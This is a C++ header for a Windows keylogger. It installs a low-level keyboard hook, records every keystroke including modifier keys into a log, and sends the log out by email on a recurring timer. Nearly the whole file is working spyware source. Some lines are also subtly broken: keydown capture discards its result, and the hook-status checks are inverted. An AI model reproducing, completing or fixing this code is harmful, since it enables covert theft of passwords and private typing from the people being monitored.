
#ifndef KEYBHOOK_H

#define KEYBHOOK_H

#include<iostream>
#include<fstream>
#include "windows.h"
#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"


std::string KeyLog = "";

void TimerSendMail()
{
    if(KeyLog.empty())
        return;
    std::string last_file = IO::WriteLog(KeyLog);

    if(last_file.empty())
    {
        Helper::WriteAppLog("File creation was not successful. KeyLog'" + KeyLog + "'");
        return;
    }

    int x = Mail::SendMail("Log [" + last_file + "]",
                           "Hi :)\nThe file has been attached to this mail :) \nFor testing, enjoy:\n" + KeyLog, IO::GetOurPath(true) + last_file);

    if(x!=7)
        Helper::WriteAppLog("Mail was not send! Error code: " + Helper::ToString(x));
    else
        KeyLog = "";
}

Timer MailTimer(TimerSendMail, 500*60,Timer::Infinite);

HHOOK eHOOK = NULL;


LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
    if(nCode < 0){
        CallNextHookEx(eHOOK,nCode,wparam,lparam);
    }
   // KBDLLHOOKSTRUCT look up on the net
   KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *) lparam;
   if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
   {
       KeyLog + Keys::KEYS[kbs->vkCode].Name;
       if(kbs->vkCode == VK_RETURN)
        KeyLog += '\n';
   }
   else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
   {
       //[SHIFT][a][b][c][/SHIFT] [r][o][t]
       DWORD key = kbs->vkCode;
       if(key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL || key == VK_SHIFT || key == VK_RSHIFT || key == VK_LSHIFT || key == VK_MENU || key == VK_LMENU || key == VK_RMENU || key == VK_CAPITAL || key == VK_NUMLOCK || key == VK_LWIN || key == VK_RWIN)
       {
           std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
           KeyName.insert(1,"/");
           KeyLog += KeyName;
       }
   }
   return CallNextHookEx(eHOOK,nCode,wparam,lparam);
}

bool InstallHook()
{
    Helper::WriteAppLog("Hook Started... Timer started");
    MailTimer.Start(true);

    eHOOK = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle(NULL),0);

    return eHOOK == NULL; //if equal its true otherwise false;
}

bool UninstallHook()
{
    BOOL b = UnhookWindowsHookEx(eHOOK);
    eHOOK = NULL;
    return (bool)b;
}

bool isHooked()
{
    return (bool)(eHOOK == NULL);
}


#endif // KEYBHOOK_H
